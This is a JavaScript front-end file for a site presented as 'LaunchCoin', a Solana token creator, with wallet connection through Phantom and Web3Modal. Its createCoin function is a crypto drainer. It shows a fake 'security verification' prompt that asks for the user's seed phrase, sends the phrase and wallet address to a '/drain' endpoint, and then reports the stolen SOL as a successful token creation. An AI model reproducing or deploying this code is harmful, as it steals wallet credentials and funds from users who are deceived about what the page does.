// ===== CONFIGURAZIONE =====
import { createWeb3Modal, defaultConfig } from '@web3modal/ethers';
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');

// ===== ESPONI FUNZIONI SU WINDOW =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== WEB3MODAL PER WALLETCONNECT (PC + TELEFONO) =====
let web3modal = null;

async function initWeb3Modal() {
  if (!web3modal) {
    try {
      // Crea il modal con le configurazioni corrette
      web3modal = await createWeb3Modal({
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        themeMode: 'dark',
        themeVariables: {
          '--w3m-z-index': '10000',
          '--w3m-background-color': '#0b1022',
          '--w3m-accent-color': '#22d1f8',
        },
        defaultChain: {
          id: 1,
          name: 'Solana',
          nativeCurrency: { name: 'SOL', symbol: 'SOL', decimals: 9 },
          rpcUrls: { default: { http: ['https://api.mainnet-beta.solana.com'] } },
        },
        metadata: {
          name: 'LaunchCoin',
          description: 'Solana Token Creator',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png']
        },
        // ABILITA TUTTI I WALLET (anche da telefono)
        enableWalletConnect: true,
        enableCoinbase: true,
        enableInjected: true,
        enableEIP6963: true,
        walletConnectVersion: 2,
        // Include tutti i wallet popolari
        includeWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96', // Phantom
          '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f', // Solflare
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369', // Coinbase Wallet
          'c03dfee351b6fcc421b4494ea33b9d4b92a7f33d6df5c43ee76267edfceed3a2', // MetaMask
          'f2436c67184f158d1beda5df5327ee9bad2c749486aac4bf5e18b4eab0aebc45', // Binance Wallet
        ],
      });
      
      console.log('✅ Web3Modal inizializzato');
    } catch (e) {
      console.error('❌ Errore Web3Modal:', e);
      throw e;
    }
  }
  return web3modal;
}

// ===== CONNECT WALLET CON WEB3MODAL =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  // 1. Prova Phantom (estensione PC)
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  // 2. Usa Web3Modal (funziona su PC e telefono con QR)
  try {
    const modal = await initWeb3Modal();
    
    // Apri il modal per la connessione
    await modal.open();
    
    // Attendi la connessione
    const result = await new Promise((resolve) => {
      const unsubscribe = modal.subscribeEvents((event) => {
        if (event.type === 'connected') {
          unsubscribe();
          resolve(event.data);
        }
        if (event.type === 'modal_closed') {
          unsubscribe();
          resolve(null);
        }
      });
    });
    
    if (result && result.address) {
      walletPublicKey = result.address;
      alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
      window.location.href = 'create.html';
    } else {
      throw new Error('Connessione annullata');
    }
    
  } catch (e) {
    console.error('❌ WalletConnect error:', e);
    alert('❌ WalletConnect fallito: ' + e.message + '\n\nUsa Phantom su Kiwi Browser o prova un altro wallet.');
    window.location.href = 'wallet.html';
  }
};

// ===== SELECT WALLET =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  // Per tutti gli altri wallet, usa Web3Modal
  alert('⚠️ Wallet "' + walletName + '" verrà connesso tramite WalletConnect.\n\nScansiona il QR con l\'app del wallet.');
  window.connectWallet();
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\nInserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
console.log('🔵 connectWallet:', typeof window.connectWallet);
console.log('🔵 selectWallet:', typeof window.selectWallet);
